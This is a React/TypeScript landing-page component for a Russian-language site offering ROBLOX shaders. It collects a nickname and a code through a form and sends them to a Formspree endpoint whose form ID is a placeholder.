
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import StarfieldBackground from "@/components/StarfieldBackground";

const Index = () => {
  const [nickname, setNickname] = useState("");
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!nickname.trim() || !code.trim()) {
      toast({
        title: "Ошибка",
        description: "Пожалуйста, заполните все поля",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      // Отправка данных через Email.js
      // Здесь используем публичный сервис для отправки форм Formspree
      const response = await fetch('https://formspree.io/f/ВАША_ФОРМА_ID', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ nickname, code })
      });
      
      if (response.ok) {
        toast({
          title: "Успешно!",
          description: "Шейдеры будут отправлены в течение 24 часов. Спасибо!",
        });
        setNickname("");
        setCode("");
      } else {
        throw new Error('Ошибка при отправке данных');
      }
    } catch (error) {
      toast({
        title: "Ошибка отправки",
        description: "Пожалуйста, попробуйте позже или свяжитесь с поддержкой",
        variant: "destructive"
      });
      console.error("Error sending form:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-[#1A1F2C] to-[#121620] p-4 relative overflow-hidden">
      <StarfieldBackground />
      
      <div className="animate-fade-in w-full max-w-4xl mx-auto text-center mb-10 relative z-10">
        <h1 className="text-6xl font-bold text-[#9b87f5] mb-4 tracking-tight">
          FreshShaders
        </h1>
        <div className="h-1 w-48 bg-[#7E69AB] mx-auto mb-6 rounded-full"></div>
      </div>

      <Card className="w-full max-w-md mx-auto border-[#9b87f5]/20 bg-black/40 backdrop-blur-sm relative z-10">
        <CardHeader>
          <CardTitle className="text-2xl text-center text-white">
            Получение Шейдеров
          </CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="code" className="text-white">
                Код
              </Label>
              <Input
                id="code"
                placeholder="Введите ваш код"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="bg-[#2A2F3C] border-[#9b87f5]/30 focus:border-[#9b87f5] text-white"
                required
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="nickname" className="text-white">
                Никнейм
              </Label>
              <Input
                id="nickname"
                placeholder="Введите ваш никнейм"
                value={nickname}
                onChange={(e) => setNickname(e.target.value)}
                className="bg-[#2A2F3C] border-[#9b87f5]/30 focus:border-[#9b87f5] text-white"
                required
              />
            </div>
            <Button
              type="submit"
              className="w-full bg-[#9b87f5] hover:bg-[#7E69AB] text-white font-medium"
              disabled={isLoading}
            >
              {isLoading ? "Отправка..." : "Получить шейдеры"}
            </Button>
          </form>
        </CardContent>
      </Card>
      
      <footer className="mt-10 text-gray-400 text-sm text-center relative z-10">
        © {new Date().getFullYear()} FreshShaders для ROBLOX
      </footer>
    </div>
  );
};

export default Index;
